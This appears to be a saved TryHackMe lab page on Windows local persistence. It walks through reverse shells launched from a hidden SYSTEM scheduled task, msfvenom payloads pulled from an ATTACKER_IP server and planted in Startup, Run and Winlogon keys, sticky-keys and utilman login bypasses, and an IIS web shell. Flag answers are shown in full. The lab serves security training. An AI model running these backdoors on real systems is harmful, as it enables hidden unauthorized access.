                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Abusing Scheduled Tasks
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:</p>

<p><span style="font-size:24px">Task Scheduler</span></p>
<p>The most common way to schedule tasks is using the built-in <strong>Windows task scheduler</strong>. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use <code>schtasks</code> to interact with the task scheduler. A complete reference for the command can be found on <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">Microsoft's website</a>.</p>
<p>Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.</span></code>
        </pre>
    </div>
</div>
<p><b>Note:</b> Be sure to use <code>THM-TaskBackdoor</code> as the name of your task, or you won't get the flag.</p>
<p>The previous command will create a "THM-TaskBackdoor" task and execute an&nbsp;<code>nc64</code> reverse shell back to the attacker. The <code>/sc</code> and <code>/mo</code> options indicate that the task should be run every single minute. The <code>/ru</code> option indicates that the task will run with SYSTEM privileges.</p>
<p>To check if our task was successfully created, we can use the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready</span></code>
        </pre>
    </div>
</div>

<p><span style="font-size:24px">Making Our Task Invisible</span></p>
<p>Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its <strong>Security Descriptor (SD)</strong><span>. The security descriptor is simply an <a class="T67sXrU0 glossary-term" onclick="initPopOver(&#39;ACL&#39;, &#39;T67sXrU0&#39;)">ACL</a> that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.</span></p>
<p>The security descriptors of all scheduled tasks are stored in <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code>. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.</p>
<p>To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use <code>psexec</code> (available in <code>C:\tools</code>) to open Regedit with SYSTEM privileges:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; c:\tools\pstools\PsExec64.exe -s -i regedit</span></code>
        </pre>
    </div>
</div>
<p>We will then delete the security descriptor for our task:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/9a6dad473b19be313e3069da0a2fc937.png" alt="Task Scheduler SD"></p>
<p>If we try to query our service again, the system will tell us there is no such task:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.</span></code>
        </pre>
    </div>
</div>
<p>If we start an nc listener in our attacker's machine, we should get a shell back after a minute:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4449</span></span></span></code>
        </pre>
    </div>
</div>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Use the reverse shell obtained through the task scheduler and execute <code>C:\flags\flag9.exe</code> to retrieve a flag.</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag9 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*********************}" value="THM{JUST_A_MATTER_OF_TIME}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Logon Triggered Persistence
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.</p>

<p><span style="font-size:24px">Startup folder</span></p>
<p>Each user has a folder under <code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.</p>
<p>If we want to force all users to run a payload while logging in, we can use the folder under <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>&nbsp;in the same way.</p>
<p>For this task, let's generate a reverse shell payload using msfvenom:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4450</span> -f exe -o revshell.exe</span></span></code>
        </pre>
    </div>
</div>
<p>We will then copy our payload into the victim machine. You can spawn an <code>http.server</code> with Python3 and use wget on the victim machine to pull your file:</p>
<table><tbody><tr>
<td style="width:45%">
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server </span></span>
<span class="token output"><span>Serving <a class="qQC4kmgD glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;qQC4kmgD&#39;)">HTTP</a> on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... </span></span></code>
        </pre>
    </div>
</div>
</td>
<td><span style="font-size:64px">âžœ</span></td>
<td style="width:45%">
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Powershell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class="  language-shell-session"><span class="token output">PS C:\&gt; wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe</span></code>
        </pre>
    </div>
</div>
</td>
</tr></tbody></table>
<p>We then store the payload into the <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> folder to get a shell back for any user logging into the machine.</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"</span></code>
        </pre>
    </div>
</div>
<p><span>Now be sure to sign out of your session from the start menu (closing the <a class="ck84uYdT glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;ck84uYdT&#39;)">RDP</a> window is not enough as it leaves your session open):</span></p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/f0ba7fd44646d55c5505737642bdd96e.png" alt="sign out"></p>
<p><span>And log back via <a class="eOKNo1V3 glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;eOKNo1V3&#39;)">RDP</a>. You should immediately receive a connection back to your attacker's machine.</span></p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Use your newly obtained shell to execute <code>C:\flags\flag10.exe</code> and get your flag!</span>
        </div>
</div>

<p><span style="font-size:24px">Run / RunOnce</span></p>
<p>You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:</p>
<ul>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
</ul>
<p>The registry entries under <code>HKCU</code> will only apply to the current user, and those under <code>HKLM</code> will apply to everyone. Any program specified under the <code>Run</code> keys will run every time the user logs on. Programs specified under the <code>RunOnce</code> keys will only be executed a single time.</p>
<p>For this task, let's create a new reverse shell with msfvenom:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4451</span> -f exe -o revshell.exe</span></span></code>
        </pre>
    </div>
</div>
<p>After transferring it to the victim machine, let's move it to <code>C:\Windows\</code>:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; move revshell.exe C:\Windows</span></code>
        </pre>
    </div>
</div>
<p>Let's then create a <code>REG_EXPAND_SZ</code> registry entry under <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>. The entry's name can be anything you like, and the value will be the command we want to execute.</p><p><b>Note: </b>While in a real-world set-up you could use any name for your registry entry, for this task you are required to use <code>MyBackdoor</code>&nbsp;to receive the flag.</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/c99038cd6cc9e37512edabb1f873a4da.png" alt="backdoored Run entry"></p>
<p>After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Using your newly obtained shell, execute <code>C:\flags\flag11.exe</code> to get a flag!</span>
        </div>
</div>

<p><span style="font-size:24px">Winlogon</span></p>
<p>Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).</p>
<p>Winlogon uses some registry keys under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> that could be interesting to gain persistence:</p>
<ul>
<li><code>Userinit</code> points to <code>userinit.exe</code>, which is in charge of restoring your user profile preferences.</li>
<li><code>shell</code> points to the system's shell, which is usually <code>explorer.exe</code>.</li>
</ul>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/f3c2215af6e3f2d19313498fca62a9d4.png" alt="Winlogon registry"></p>
<p>If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.</p><p>Let's start by creating a shell:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4452</span> -f exe -o revshell.exe</span></span></code>
        </pre>
    </div>
</div>
<p>We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use <code>C:\Windows</code>:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; move revshell.exe C:\Windows</span></code>
        </pre>
    </div>
</div>
<p>We then alter either <code>shell</code> or <code>Userinit</code> in <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code>. In this case we will use <code>Userinit</code>, but the procedure with <code>shell</code> is the same.</p><p><b>Note: </b>While both <code>shell</code> and <code>Userinit</code> could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use <code>Userinit</code>.</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/dc5fa3e75ff056f11e16c03373799f45.png" alt="Backdoored userinit"></p>
<p>After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Using your newly obtained shell, execute <code>C:\flags\flag12.exe</code> to get a flag!</span>
        </div>
</div>

<p><span style="font-size:24px">Logon scripts</span></p>
<p>One of the things <code>userinit.exe</code> does while loading your user profile is to check for an environment variable called <code>UserInitMprLogonScript</code>. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.</p>
<p>Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.</p>
<p>Let's first create a reverse shell to use for this technique:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4453</span> -f exe -o revshell.exe</span></span></code>
        </pre>
    </div>
</div>
<p>We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use <code>C:\Windows</code>:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; move revshell.exe C:\Windows</span></code>
        </pre>
    </div>
</div>
<p>To create an environment variable for a user, you can go to its <code>HKCU\Environment</code> in the registry. We will use the <code>UserInitMprLogonScript</code> entry to point to our payload so it gets loaded when the users logs in:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/9ce41ee1fc282b8dcacd757b23417b12.png" alt="Backdoored env"></p>
<p>Notice that this registry key has no equivalent in <code>HKLM</code>, making your backdoor apply to the current user only.</p>
<p>After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Using your newly obtained shell, execute <code>C:\flags\flag13.exe</code> to get a flag!</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag10 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***************}" value="THM{NO_NO_AFTER_YOU}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag11 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{****************************}" value="THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag12 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************}" value="THM{I_INSIST_GO_FIRST}" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag13 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{******************************}" value="THM{USER_TRIGGERED_PERSISTENCE_FTW}" disabled="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Backdooring the Login Screen / RDP
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>If we have physical access to the machine (or <a class="oHrswSF5 glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;oHrswSF5&#39;)">RDP</a> in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.</span></p>
<p>We will look at two methods that rely on accessibility features to this end.</p>

<p><span style="font-size:24px">Sticky Keys</span></p>
<p>When pressing key combinations like <code>CTRL + ALT + DEL</code>, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release <code>CTRL</code>, press and release <code>ALT</code> and finally, press and release <code>DEL</code> to achieve the same effect as pressing the&nbsp;<code>CTRL + ALT + DEL</code> combination.</p>
<p>To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing <code>SHIFT</code> 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/27e711818bea549ace3cf85279f339c8.png" alt="sticky keys"></p>
<p>After pressing <code>SHIFT</code> 5 times, Windows will execute the binary in <code>C:\Windows\System32\sethc.exe</code>. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.</p>
<p>A straightforward way to backdoor the login screen consists of replacing <code>sethc.exe</code>&nbsp;with a copy of <code>cmd.exe</code>. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.</p>
<p>To overwrite <code>sethc.exe</code>, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of <code>cmd.exe</code>. We can do so with the following commands:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\&gt; icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.</span></code>
        </pre>
    </div>
</div>
<p>After doing so, lock your session from the start menu:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/2faf2bec5763297beb7c921858900c57.png" alt="lock session"></p>
<p>You should now be able to press <code>SHIFT</code> five times to access a terminal with SYSTEM privileges directly from the login screen:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/5062148957ec1d70dccd080bdca93ddf.png" alt="sethc backdoor"></p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">From your newly obtained terminal, execute <code>C:\flags\flag14.exe</code> to get your flag!</span>
        </div>
</div>

<p><span style="font-size:24px">Utilman</span></p>
<p>Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/73c7698a015de5a988fd815ff3e41473.png" alt="utilman"></p>
<p>When we click the ease of access button on the login screen, it executes <code>C:\Windows\System32\Utilman.exe</code> with SYSTEM privileges. If we replace it with a copy of <code>cmd.exe</code>, we can bypass the login screen again.</p>
<p>To replace <code>utilman.exe</code>, we do a similar process to what we did with <code>sethc.exe</code>:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\&gt; icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.</span></code>
        </pre>
    </div>
</div>
<p>To trigger our terminal, we will lock our screen from the start button:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/1f94b28361ffebbf70d280755821bc12.png" alt="lock session"></p>
<p>And finally, proceed to click on the "Ease of Access" button. Since we replaced <code>utilman.exe</code> with a <code>cmd.exe</code> copy, we will get a command prompt with SYSTEM privileges:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/0fe1901296108241e2700abf87fa6a27.png" alt="backdoored utilman"></p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">From your newly obtained terminal, execute <code>C:\flags\flag15.exe</code> to get your flag!</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag14 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**********************}" value="THM{BREAKING_THROUGH_LOGIN}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag15 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***************************************}" value="THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Persisting Through Existing Services
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!</p>

<p><span style="font-size:24px">Using Web Shells</span></p>
<p>The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is <code>iis apppool\defaultapppool</code>. Even if this is an unprivileged user, it has the special <code>SeImpersonatePrivilege</code>, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the <a href="https://tryhackme.com/room/windowsprivesc20">Windows Privesc Room</a>.</p>
<p>Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided&nbsp;<a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">here</a>, but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the <code>C:\inetpub\wwwroot</code> directory:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; move shell.aspx C:\inetpub\wwwroot\</span></code>
        </pre>
    </div>
</div>
